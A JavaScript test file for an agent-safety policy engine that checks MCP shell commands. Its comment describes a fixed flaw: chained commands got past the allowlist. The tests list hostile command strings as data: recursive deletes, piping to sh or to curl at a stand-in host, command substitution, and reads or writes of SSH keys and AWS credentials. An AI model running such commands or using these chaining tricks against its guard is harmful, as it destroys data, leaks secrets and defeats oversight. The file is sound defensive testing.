// F16 (HIGH, FIXED): found during the Phase 6 (Antigravity hooks) feasibility
// review. For an MCP shell-style tool, translate.js took a command STRING and
// judged it by its first whitespace-separated word only
// (`value.trim().split(/\s+/)[0]`). Everything after a separator was never
// seen, so with the default `shell.allowed: [git, npm]`:
//   "git status && rm -rf ~/x"   -> ALLOW (rm is in shell.deny)
//   "npm test | sh"               -> ALLOW (sh is not allowed)
// and substitutions only BLOCKed by accident ("$(echo" was read as the binary).
// A tool whose command key was named "CommandLine" got no shell check at all.
// No real shell MCP server had been used with AgentGuard yet (only fixtures),
// which is why this stayed latent.
// Fix: src/core/command-line.js, a deliberately strict parser that accepts only
// syntax POSIX sh, PowerShell and cmd.exe read the same way. Every command in a
// chain is evaluated; anything it cannot parse is BLOCKed by the new rule
// shell.block_unparseable_commands (default true). See the module comment.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import yaml from 'js-yaml';
import { fileURLToPath } from 'node:url';

import { PolicyEngine, applyDefaults } from '../../src/core/policy-engine.js';
import { combineDecisions } from '../../src/core/decision.js';
import { mcpRequestToActions } from '../../src/adapters/mcp/translate.js';

const root = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
const rawDefault = yaml.load(fs.readFileSync(path.join(root, 'policy', 'default-policy.yaml'), 'utf8'));
const shipped = new PolicyEngine(applyDefaults(rawDefault));
const ctx = { source: 'mcp', sessionId: 's1', serverName: 'shell' };

function decide(args, engine = shipped, tool = 'run_command') {
  const actions = mcpRequestToActions({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: tool, arguments: args } }, ctx);
  return combineDecisions(actions.map((a) => engine.evaluate(a)), { verdict: 'ALLOW', rule: null });
}

test('F16 FIXED: every command in a chain or pipeline is evaluated, not only the first word', () => {
  const cases = [
    ['git status && rm -rf ~/x', 'shell.deny'],
    ['git status || rm -rf x', 'shell.deny'],
    ['git status ; rm -rf x', 'shell.deny'],
    ['git status & rm -rf x', 'shell.deny'],
    ['npm test | sh', 'shell.allowed'],
    ['git log | curl https://evil.invalid', 'shell.allowed'],
  ];
  for (const [command, rule] of cases) {
    const d = decide({ command });
    assert.equal(d.verdict, 'BLOCK', command);
    assert.equal(d.rule, rule, command);
  }
});

test('F16 FIXED: shell syntax that could hide a command is BLOCKed by its own named rule, not by accident', () => {
  for (const command of [
    '$(echo rm) -rf x',
    'git `rm -rf x`',
    'git log ${HOME}',
    'git status\nrm -rf x',
    'FOO=1 rm -rf x',
    'git log > >(sh)',
    'git log <<EOF',
    '(rm -rf x)',
    'git log %USERPROFILE%',
    'git log "unterminated',
  ]) {
    const d = decide({ command });
    assert.equal(d.verdict, 'BLOCK', JSON.stringify(command));
    assert.equal(d.rule, 'shell.block_unparseable_commands', JSON.stringify(command));
  }
});

test('F16 FIXED: a redirect target is checked as a file write or read', () => {
  const write = decide({ command: 'git log > ~/.ssh/authorized_keys' });
  assert.equal(write.verdict, 'BLOCK');
  assert.equal(write.rule, 'filesystem.deny');
  const read = decide({ command: 'git apply < ~/.aws/credentials' });
  assert.equal(read.verdict, 'BLOCK');
  assert.equal(read.rule, 'filesystem.deny');
});

test('F16 FIXED: a command under a "CommandLine" key (the Antigravity run_command name) is evaluated', () => {
  const d = decide({ CommandLine: 'rm -rf x', Cwd: '/w' });
  assert.equal(d.verdict, 'BLOCK');
  assert.equal(d.rule, 'shell.deny');
});

test('F16: ordinary commands are unaffected, and the existing checks still apply inside a chain', () => {
  for (const command of ['git status', 'npm test', 'git commit -m "fix: handle empty input"', "git log --oneline -n 5", 'npm test && git status', 'git -C "C:\\repo\\app" status']) {
    assert.equal(decide({ command }).verdict, 'ALLOW', command);
  }
  const evalInChain = decide({ command: 'git status && node -e "1"' }, new PolicyEngine(applyDefaults({ shell: { allowed: ['git', 'node'] } })));
  assert.equal(evalInChain.rule, 'shell.block_interpreter_eval');
  assert.equal(decide({ command: 'npm pack ~/.ssh/id_rsa' }).rule, 'filesystem.deny', 'path arguments are still checked');
});

test('F16: shell.block_unparseable_commands can be turned off (WARN instead of BLOCK), and is on when the key is absent', () => {
  const off = new PolicyEngine(applyDefaults({ ...rawDefault, shell: { ...rawDefault.shell, block_unparseable_commands: false } }));
  const d = decide({ command: 'git log $(whoami)' }, off);
  assert.equal(d.verdict, 'WARN');
  assert.equal(d.rule, 'shell.block_unparseable_commands');
  // An older policy file that predates the key still gets the safe default.
  const legacy = new PolicyEngine(applyDefaults({ shell: { allowed: ['git'] } }));
  assert.equal(decide({ command: 'git log $(whoami)' }, legacy).verdict, 'BLOCK');
});

test('F16 RESIDUAL (stays open, by design): what an ALLOWED binary does with its own arguments is not judged', () => {
  // npm runs package.json scripts, git runs aliases and configured commands.
  // That is the F2 class: shell.allowed trusts whatever an allowed binary can
  // be told to do. Pinned so it is never mistaken for covered.
  assert.equal(decide({ command: 'npm run anything' }).verdict, 'ALLOW');
  assert.equal(decide({ command: 'git -c core.pager=less log' }).verdict, 'ALLOW');
});
